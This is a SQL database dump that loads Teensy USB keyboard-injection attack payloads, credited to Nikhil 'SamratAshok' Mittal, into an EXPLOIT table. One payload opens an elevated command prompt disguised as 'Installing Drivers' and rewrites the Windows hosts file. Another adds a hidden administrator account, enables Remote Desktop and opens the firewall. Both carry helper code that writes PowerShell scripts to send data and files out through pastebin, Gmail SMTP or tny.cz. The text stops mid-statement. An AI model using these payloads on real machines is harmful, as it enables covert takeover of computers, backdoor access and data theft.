/*C3*/SET SCHEMA PUBLIC
INSERT INTO EXPLOIT VALUES(6,'Nikhil "SamratAshok" Mittal','#define TEENSY<!--teensynumber-->\u000d#ifdef TEENSY2\u000d    #include<usb_private.h>\u000d#endif\u000dvoid setup(){\u000d  delay(3000);\u000d  wait_for_drivers(2000);\u000d\u000d  minimise_windows();\u000d  delay(500);\u000d  while(!cmd_admin(3,500))\u000d  {\u000d  reset_windows_desktop(2000);\u000d  }\u000d  Keyboard.println("echo <!--ipresolve--> <!--domainToResolve-->>>%systemroot%\\system32\\drivers\\etc\\hosts");\u000d  delay(2000);\u000d  Keyboard.println("exit");\u000d }\u000d\u000dvoid loop() {}\u000d\u000dvoid wait_for_drivers(int sleep)\u000d{\u000dbool CapsLockTrap = is_caps_on();\u000dwhile(CapsLockTrap == is_caps_on())\u000d{\u000dKeyboard.set_key1(KEY_CAPS_LOCK);\u000dKeyboard.send_now();\u000ddelay(200);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(sleep);\u000d}\u000dKeyboard.set_key1(KEY_CAPS_LOCK);\u000dKeyboard.send_now();\u000ddelay(200);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(sleep);\u000d}\u000d\u000dint ledkeys(void) {return int(keyboard_leds);}\u000d\u000dbool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}\u000d\u000dbool cmd_admin(int reps, int millisecs)\u000d{\u000dmake_sure_capslock_is_off();\u000ddelay(700);\u000dKeyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\u000dKeyboard.send_now();\u000dKeyboard.set_modifier(0);\u000dKeyboard.send_now();\u000ddelay(3000);\u000dKeyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\"");\u000ddelay(2000);\u000dKeyboard.set_modifier(MODIFIERKEY_CTRL);\u000dKeyboard.send_now();\u000dKeyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);\u000dKeyboard.send_now();\u000dKeyboard.set_key1(KEY_ENTER);\u000dKeyboard.send_now();\u000ddelay(200);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(7000);\u000dsend_left_enter();\u000ddelay(4000);\u000dcreate_click_capslock_win();\u000dcheck_for_capslock_success_teensy(reps,millisecs);\u000d}\u000d\u000dbool cmd(int reps, int millisecs, char *SomeCommand)\u000d{\u000dmake_sure_capslock_is_off();\u000ddelay(700);\u000dKeyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\u000dKeyboard.set_key1(KEY_R);\u000dKeyboard.send_now();\u000d\u000ddelay(500);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000d\u000dKeyboard.print(SomeCommand);\u000dKeyboard.set_key1(KEY_ENTER);\u000dKeyboard.send_now();\u000d\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000d\u000ddelay(3000);\u000dcreate_click_capslock_win();\u000dcheck_for_capslock_success_teensy(reps,millisecs);\u000d}\u000d\u000dvoid make_sure_capslock_is_off(void)\u000d{\u000dif (is_caps_on())\u000d{\u000ddelay(500);\u000dKeyboard.set_key1(KEY_CAPS_LOCK);\u000dKeyboard.send_now();\u000ddelay(200);\u000ddelay(700);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(700);\u000d}\u000d}\u000d\u000dvoid create_click_capslock_win()\u000d{\u000dKeyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\capslock.vbs");\u000ddelay(400);\u000dKeyboard.println("wscript %temp%\\capslock.vbs");\u000ddelay(2000);\u000d}\u000d\u000dbool check_for_capslock_success_teensy(int reps, int millisecs)\u000d{\u000dunsigned int i = 0;\u000ddo\u000d{\u000ddelay(millisecs);\u000dif (is_caps_on())\u000d{\u000dmake_sure_capslock_is_off();\u000ddelay(700);\u000dreturn true;\u000d}\u000di++;\u000d}\u000dwhile (!is_caps_on() && (i<reps));\u000dreturn false;\u000d}\u000d\u000dvoid minimise_windows(void)\u000d{\u000dKeyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\u000dKeyboard.set_key1(KEY_M);\u000dKeyboard.send_now();\u000ddelay(300);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(300);\u000d}\u000d\u000dvoid reset_windows_desktop(int sleep)\u000d{\u000ddelay(1000);\u000dminimise_windows();\u000ddelay(sleep);\u000dminimise_windows();\u000ddelay(sleep);\u000dminimise_windows();\u000ddelay(200);\u000d}\u000d\u000dvoid send_left_enter(){\u000d  delay(1000);\u000d  Keyboard.set_key1(KEY_LEFT);\u000d  Keyboard.send_now();\u000d  delay(100);\u000d  Keyboard.set_key1(0);\u000d  Keyboard.send_now();\u000d\u000d  Keyboard.set_key1(KEY_ENTER);\u000d  Keyboard.send_now();\u000d  delay(100);\u000d  Keyboard.set_key1(0);\u000d  Keyboard.send_now();\u000d  }\u000d\u000dvoid post(String filename)\u000d{\u000d    Keyboard.print("echo function pht($url,$pars) { >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht = New-Object -ComObject Msxml2.XMLHTTP >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.open(\"POST\", $url, $false) >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\") >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.setRequestHeader(\"Content-length\", $pars.length); >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.setRequestHeader(\"Connection\", \"close\") >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.send($pars) >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $script:sk=$ht.responseText }>> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d}\u000d\u000dvoid pastebin(String filename)\u000d{\u000d    post(filename);\u000d    Keyboard.print("echo pht \"https://pastebin.com/api/api_login.php\" \"api_dev_key=$dev&api_user_name=$user&api_user_password=$pass\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo pht \"https://pastebin.com/api/api_post.php\" \"api_user_key=$sk&api_option=paste&api_dev_key=$dev&api_paste_name=$pn&api_paste_code=$pv&api_paste_private=2\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d}\u000d\u000dvoid gmail(String filename, String filepath)\u000d{\u000d    post(filename);\u000d    Keyboard.print("echo $srv = \"smtp.gmail.com\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg = new-object Net.Mail.MailMessage >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $st = new-object Net.Mail.SmtpClient($srv) >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $st.EnableSsl = $True >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $st.Credentials = New-Object System.Net.NetworkCredential(\"$user\", \"$pass\"); >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg.From = \"$user@gmail.com\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg.To.Add(\"$user@gmail.com\") >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg.Subject = $pn >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg.Body = $pv >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    if (filepath != "no"){\u000d    \u000d        Keyboard.print("echo $att = new-object Net.Mail.Attachment(\"");\u000d        Keyboard.print (filepath);\u000d        Keyboard.print ("\") >> %temp%\\");\u000d        Keyboard.print(filename);\u000d        Keyboard.println(".ps1");\u000d        Keyboard.print("echo $msg.Attachments.Add($att) >> %temp%\\");\u000d        Keyboard.print(filename);\u000d        Keyboard.println(".ps1");\u000d    }\u000d    Keyboard.print("echo $st.Send($msg) >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d}\u000d\u000dvoid tinypaste(String filename)\u000d{\u000d    post(filename);\u000d    //http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell\u000d    Keyboard.print("echo $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $utf8 = new-object -TypeName System.Text.UTF8Encoding >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($pass))).Replace(\"-\", \"\").ToLower() >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo pht \"http://tny.cz/api/create.xml\" \"paste=$pv&title=$pn&is_code=0&is_private=1&authenticate=$user`:$hash\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d\u000d}\u000d','2013-07-18 00:00:00.000000','Keyboard Edit the Host File (Windows)','TEENSY')
COMMIT
INSERT INTO PROPERTIES VALUES(9,'teensynumber','<!--teensynumber-->','',6,6)
COMMIT
INSERT INTO PROPERTIES VALUES(10,'ipresolve','<!--ipresolve-->','',6,6)
COMMIT
INSERT INTO PROPERTIES VALUES(11,'domainToResolve','<!--domainToResolve-->','',6,6)
COMMIT
INSERT INTO EXPLOIT VALUES(7,'Nikhil "SamratAshok" Mittal','#define TEENSY<!--teensynumber-->\u000d#ifdef TEENSY2\u000d    #include<usb_private.h>\u000d#endif\u000d\u000d# define PAYLOAD_USER_ADD "net user <!--user--> <!--password--> /add"\u000d# define PAYLOAD_GROUP_ADD "net localgroup Administrators <!--user--> /add"\u000d\u000dvoid setup(){\u000d delay(3000);\u000d  wait_for_drivers(2000);\u000d\u000d  minimise_windows();\u000d  delay(500);\u000d  while(!cmd_admin(3,500))\u000d  {\u000d  reset_windows_desktop(2000);\u000d  }\u000dadd_user();\u000dKeyboard.println("reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");\u000ddelay(2000);\u000dKeyboard.println("reg add \"HKLM\\System\\CurrentControlSet\\Services\\TermService\" /v Start /t REG_DWORD /d 2 /f");\u000ddelay(2000);\u000dKeyboard.println("sc start termservice");\u000ddelay(2000);\u000dKeyboard.println("netsh firewall set service type = remotedesktop mode = enable");\u000ddelay(3000);\u000dKeyboard.println("exit");\u000d}\u000d\u000dvoid loop(){\u000d}\u000d\u000dvoid add_user(){\u000ddelay(2000);\u000dKeyboard.println(PAYLOAD_USER_ADD);\u000ddelay(2000);\u000dKeyboard.println(PAYLOAD_GROUP_ADD);\u000ddelay(1000);\u000d\u000d}\u000d\u000dvoid wait_for_drivers(int sleep)\u000d{\u000dbool CapsLockTrap = is_caps_on();\u000dwhile(CapsLockTrap == is_caps_on())\u000d{\u000dKeyboard.set_key1(KEY_CAPS_LOCK);\u000dKeyboard.send_now();\u000ddelay(200);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(sleep);\u000d}\u000dKeyboard.set_key1(KEY_CAPS_LOCK);\u000dKeyboard.send_now();\u000ddelay(200);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(sleep);\u000d}\u000d\u000dint ledkeys(void) {return int(keyboard_leds);}\u000d\u000dbool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}\u000d\u000dbool cmd_admin(int reps, int millisecs)\u000d{\u000dmake_sure_capslock_is_off();\u000ddelay(700);\u000dKeyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\u000dKeyboard.send_now();\u000dKeyboard.set_modifier(0);\u000dKeyboard.send_now();\u000ddelay(3000);\u000dKeyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\"");\u000ddelay(2000);\u000dKeyboard.set_modifier(MODIFIERKEY_CTRL);\u000dKeyboard.send_now();\u000dKeyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);\u000dKeyboard.send_now();\u000dKeyboard.set_key1(KEY_ENTER);\u000dKeyboard.send_now();\u000ddelay(200);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(7000);\u000dsend_left_enter();\u000ddelay(4000);\u000dcreate_click_capslock_win();\u000dcheck_for_capslock_success_teensy(reps,millisecs);\u000d}\u000d\u000dbool cmd(int reps, int millisecs, char *SomeCommand)\u000d{\u000dmake_sure_capslock_is_off();\u000ddelay(700);\u000dKeyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\u000dKeyboard.set_key1(KEY_R);\u000dKeyboard.send_now();\u000d\u000ddelay(500);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000d\u000dKeyboard.print(SomeCommand);\u000dKeyboard.set_key1(KEY_ENTER);\u000dKeyboard.send_now();\u000d\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000d\u000ddelay(3000);\u000dcreate_click_capslock_win();\u000dcheck_for_capslock_success_teensy(reps,millisecs);\u000d}\u000d\u000dvoid make_sure_capslock_is_off(void)\u000d{\u000dif (is_caps_on())\u000d{\u000ddelay(500);\u000dKeyboard.set_key1(KEY_CAPS_LOCK);\u000dKeyboard.send_now();\u000ddelay(200);\u000ddelay(700);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(700);\u000d}\u000d}\u000d\u000dvoid create_click_capslock_win()\u000d{\u000dKeyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\capslock.vbs");\u000ddelay(400);\u000dKeyboard.println("wscript %temp%\\capslock.vbs");\u000ddelay(2000);\u000d}\u000d\u000dbool check_for_capslock_success_teensy(int reps, int millisecs)\u000d{\u000dunsigned int i = 0;\u000ddo\u000d{\u000ddelay(millisecs);\u000dif (is_caps_on())\u000d{\u000dmake_sure_capslock_is_off();\u000ddelay(700);\u000dreturn true;\u000d}\u000di++;\u000d}\u000dwhile (!is_caps_on() && (i<reps));\u000dreturn false;\u000d}\u000d\u000dvoid minimise_windows(void)\u000d{\u000dKeyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\u000dKeyboard.set_key1(KEY_M);\u000dKeyboard.send_now();\u000ddelay(300);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(300);\u000d}\u000d\u000dvoid reset_windows_desktop(int sleep)\u000d{\u000ddelay(1000);\u000dminimise_windows();\u000ddelay(sleep);\u000dminimise_windows();\u000ddelay(sleep);\u000dminimise_windows();\u000ddelay(200);\u000d}\u000d\u000dvoid send_left_enter(){\u000d  delay(1000);\u000d  Keyboard.set_key1(KEY_LEFT);\u000d  Keyboard.send_now();\u000d  delay(100);\u000d  Keyboard.set_key1(0);\u000d  Keyboard.send_now();\u000d\u000d  Keyboard.set_key1(KEY_ENTER);\u000d  Keyboard.send_now();\u000d  delay(100);\u000d  Keyboard.set_key1(0);\u000d  Keyboard.send_now();\u000d  }\u000d\u000dvoid post(String filename)\u000d{\u000d    Keyboard.print("echo function pht($url,$pars) { >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht = New-Object -ComObject Msxml2.XMLHTTP >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.open(\"POST\", $url, $false) >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\") >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.setRequestHeader(\"Content-length\", $pars.length); >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.setRequestHeader(\"Connection\", \"close\") >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.send($pars) >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $script:sk=$ht.responseText }>> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d}\u000d\u000dvoid pastebin(String filename)\u000d{\u000d    post(filename);\u000d    Keyboard.print("echo pht \"https://pastebin.com/api/api_login.php\" \"api_dev_key=$dev&api_user_name=$user&api_user_password=$pass\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo pht \"https://pastebin.com/api/api_post.php\" \"api_user_key=$sk&api_option=paste&api_dev_key=$dev&api_paste_name=$pn&api_paste_code=$pv&api_paste_private=2\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d}\u000d\u000dvoid gmail(String filename, String filepath)\u000d{\u000d    post(filename);\u000d    Keyboard.print("echo $srv = \"smtp.gmail.com\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg = new-object Net.Mail.MailMessage >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $st = new-object Net.Mail.SmtpClient($srv) >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $st.EnableSsl = $True >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $st.Credentials = New-Object System.Net.NetworkCredential(\"$user\", \"$pass\"); >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg.From = \"$user@gmail.com\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg.To.Add(\"$user@gmail.com\") >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg.Subject = $pn >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg.Body = $pv >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    if (filepath != "no"){\u000d    \u000d        Keyboard.print("echo $att = new-object Net.Mail.Attachment(\"");\u000d        Keyboard.print (filepath);\u000d        Keyboard.print ("\") >> %temp%\\");\u000d        Keyboard.print(filename);\u000d        Keyboard.println(".ps1");\u000d        Keyboard.print("echo $msg.Attachments.Add($att) >> %temp%\\");\u000d        Keyboard.print(filename);\u000d        Keyboard.println(".ps1");\u000d    }\u000d    Keyboard.print("echo $st.Send($msg) >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d}\u000d\u000dvoid tinypaste(String filename)\u000d{\u000d    post(filename);\u000d    //http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell\u000d    Keyboard.print("echo $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $utf8 = new-object -TypeName System.Text.UTF8Encoding >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($pass))).Replace(\"-\", \"\").ToLower() >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo pht \"http://tny.cz/api/create.xml\" \"paste=$pv&title=$pn&is_code=0&is_private=1&authenticate=$user`:$hash\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d\u000d}\u000d','2013-07-18 00:00:00.000000','Keyboard add a user and enable telnet (Windows)','TEENSY')
COMMIT
INSERT INTO PROPERTIES VALUES(12,'teensynumber','<!--teensynumber-->','',7,7)
COMMIT
INSERT INTO PROPERTIES VALUES(13,'user','<!--user-->','',7,7)
COMMIT
INSERT INTO PROPERTIES VALUES(14,'password','<!--password-->','',7,7)
COMMIT
DELETE FROM EXPLOIT WHERE EXPLOIT_ID=7
INSERT INTO EXPLOIT VALUES(7,'Nikhil "SamratAshok" Mittal','#define TEENSY<!--teensynumber-->\u000d#ifdef TEENSY2\u000d    #include<usb_private.h>\u000d#endif\u000d\u000d# define PAYLOAD_USER_ADD "net user <!--user--> <!--password--> /add"\u000d# define PAYLOAD_GROUP_ADD "net localgroup Administrators <!--user--> /add"\u000d\u000dvoid setup(){\u000d delay(3000);\u000d  wait_for_drivers(2000);\u000d\u000d  minimise_windows();\u000d  delay(500);\u000d  while(!cmd_admin(3,500))\u000d  {\u000d  reset_windows_desktop(2000);\u000d  }\u000dadd_user();\u000dKeyboard.println("reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");\u000ddelay(2000);\u000dKeyboard.println("reg add \"HKLM\\System\\CurrentControlSet\\Services\\TermService\" /v Start /t REG_DWORD /d 2 /f");\u000ddelay(2000);\u000dKeyboard.println("sc start termservice");\u000ddelay(2000);\u000dKeyboard.println("netsh firewall set service type = remotedesktop mode = enable");\u000ddelay(3000);\u000dKeyboard.println("exit");\u000d}\u000d\u000dvoid loop(){\u000d}\u000d\u000dvoid add_user(){\u000ddelay(2000);\u000dKeyboard.println(PAYLOAD_USER_ADD);\u000ddelay(2000);\u000dKeyboard.println(PAYLOAD_GROUP_ADD);\u000ddelay(1000);\u000d\u000d}\u000d\u000dvoid wait_for_drivers(int sleep)\u000d{\u000dbool CapsLockTrap = is_caps_on();\u000dwhile(CapsLockTrap == is_caps_on())\u000d{\u000dKeyboard.set_key1(KEY_CAPS_LOCK);\u000dKeyboard.send_now();\u000ddelay(200);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(sleep);\u000d}\u000dKeyboard.set_key1(KEY_CAPS_LOCK);\u000dKeyboard.send_now();\u000ddelay(200);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(sleep);\u000d}\u000d\u000dint ledkeys(void) {return int(keyboard_leds);}\u000d\u000dbool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}\u000d\u000dbool cmd_admin(int reps, int millisecs)\u000d{\u000dmake_sure_capslock_is_off();\u000ddelay(700);\u000dKeyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\u000dKeyboard.send_now();\u000dKeyboard.set_modifier(0);\u000dKeyboard.send_now();\u000ddelay(3000);\u000dKeyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\"");\u000ddelay(2000);\u000dKeyboard.set_modifier(MODIFIERKEY_CTRL);\u000dKeyboard.send_now();\u000dKeyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);\u000dKeyboard.send_now();\u000dKeyboard.set_key1(KEY_ENTER);\u000dKeyboard.send_now();\u000ddelay(200);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(7000);\u000dsend_left_enter();\u000ddelay(4000);\u000dcreate_click_capslock_win();\u000dcheck_for_capslock_success_teensy(reps,millisecs);\u000d}\u000d\u000dbool cmd(int reps, int millisecs, char *SomeCommand)\u000d{\u000dmake_sure_capslock_is_off();\u000ddelay(700);\u000dKeyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\u000dKeyboard.set_key1(KEY_R);\u000dKeyboard.send_now();\u000d\u000ddelay(500);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000d\u000dKeyboard.print(SomeCommand);\u000dKeyboard.set_key1(KEY_ENTER);\u000dKeyboard.send_now();\u000d\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000d\u000ddelay(3000);\u000dcreate_click_capslock_win();\u000dcheck_for_capslock_success_teensy(reps,millisecs);\u000d}\u000d\u000dvoid make_sure_capslock_is_off(void)\u000d{\u000dif (is_caps_on())\u000d{\u000ddelay(500);\u000dKeyboard.set_key1(KEY_CAPS_LOCK);\u000dKeyboard.send_now();\u000ddelay(200);\u000ddelay(700);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(700);\u000d}\u000d}\u000d\u000dvoid create_click_capslock_win()\u000d{\u000dKeyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\capslock.vbs");\u000ddelay(400);\u000dKeyboard.println("wscript %temp%\\capslock.vbs");\u000ddelay(2000);\u000d}\u000d\u000dbool check_for_capslock_success_teensy(int reps, int millisecs)\u000d{\u000dunsigned int i = 0;\u000ddo\u000d{\u000ddelay(millisecs);\u000dif (is_caps_on())\u000d{\u000dmake_sure_capslock_is_off();\u000ddelay(700);\u000dreturn true;\u000d}\u000di++;\u000d}\u000dwhile (!is_caps_on() && (i<reps));\u000dreturn false;\u000d}\u000d\u000dvoid minimise_windows(void)\u000d{\u000dKeyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\u000dKeyboard.set_key1(KEY_M);\u000dKeyboard.send_now();\u000ddelay(300);\u000dKeyboard.set_modifier(0);\u000dKeyboard.set_key1(0);\u000dKeyboard.send_now();\u000ddelay(500);\u000ddelay(300);\u000d}\u000d\u000dvoid reset_windows_desktop(int sleep)\u000d{\u000ddelay(1000);\u000dminimise_windows();\u000ddelay(sleep);\u000dminimise_windows();\u000ddelay(sleep);\u000dminimise_windows();\u000ddelay(200);\u000d}\u000d\u000dvoid send_left_enter(){\u000d  delay(1000);\u000d  Keyboard.set_key1(KEY_LEFT);\u000d  Keyboard.send_now();\u000d  delay(100);\u000d  Keyboard.set_key1(0);\u000d  Keyboard.send_now();\u000d\u000d  Keyboard.set_key1(KEY_ENTER);\u000d  Keyboard.send_now();\u000d  delay(100);\u000d  Keyboard.set_key1(0);\u000d  Keyboard.send_now();\u000d  }\u000d\u000dvoid post(String filename)\u000d{\u000d    Keyboard.print("echo function pht($url,$pars) { >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht = New-Object -ComObject Msxml2.XMLHTTP >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.open(\"POST\", $url, $false) >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\") >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.setRequestHeader(\"Content-length\", $pars.length); >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.setRequestHeader(\"Connection\", \"close\") >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $ht.send($pars) >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $script:sk=$ht.responseText }>> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d}\u000d\u000dvoid pastebin(String filename)\u000d{\u000d    post(filename);\u000d    Keyboard.print("echo pht \"https://pastebin.com/api/api_login.php\" \"api_dev_key=$dev&api_user_name=$user&api_user_password=$pass\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo pht \"https://pastebin.com/api/api_post.php\" 